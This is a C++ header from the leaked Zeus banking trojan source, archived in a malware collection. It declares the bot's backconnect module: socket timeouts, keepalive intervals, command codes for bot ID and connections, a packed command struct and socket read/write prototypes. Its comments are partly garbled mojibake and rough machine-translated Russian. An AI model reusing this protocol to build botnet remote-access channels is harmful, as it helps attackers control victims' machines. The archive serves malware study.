/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ����������� ��� Backconnect.
*/
#pragma once

namespace Backconnect
{
  //Nekotrye constants.
  enum
  {
    SOCKET_TIMEOUT     = 30 * 1000,     //Timeout for the socket.
    KEEPALIVE_DELAY    = 5 * 60 * 1000, //Keepalive.
    KEEPALIVE_INTERVAL = 5 * 1000       //Keepalive interval in case of error.
  };
  
  //Commands for BCCOMMAND.
  enum
  {
    COMMAND_UNKNOWN,    //Error.
    COMMAND_BOTID,      //Poslyetsya bot. Information after the structure is a string size
                        //wDataSize, carrying ID bot. Also soobshaet that this compound is
                        //manager.
    COMMAND_CONNECT,    //Poslyaetsya server. Create a new connection to the bc server. Carries
                        //DWORD itself as a unique ID for the connection.
    COMMAND_IS_SERVICE, //Poslyetsya bot. Soobshaet that this compound is a service,
                        //carries a DWORD received from COMMAND_CONNECT.
  };

  #pragma pack(push, 1)
  typedef struct
  {
    WORD structSize; //sizeof (COMMAND)
    WORD dataSize;   //Size of the data after idushih structure.
    BYTE command;    //Team
  }COMMAND;
  #pragma pack(pop)
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������ ������� �� ������.

    IN s        - �����.
    OUT command - ��������� ��� ����������.
    OUT data    - ����� ��� ������, ��� NULL ���� ������ �� ���������. ����� ������ ���� ����������
                  ����� Mem.

    Return      - true  - � ������ ��������� ������ �������.
                  false - � ������ ������.
  */
  bool _readCommand(SOCKET s, COMMAND *command, LPBYTE *data);

  /*    Sending commands to a socket.

    IN s - socket.
    IN command - the command BCC_ *.
    IN data - data.
    IN dataSize - the size of the data.

    Return - true - if successful,
                  false - if an error occurs.
  */
  bool _writeCommand(SOCKET s, BYTE command, const void *data, WORD dataSize);
};
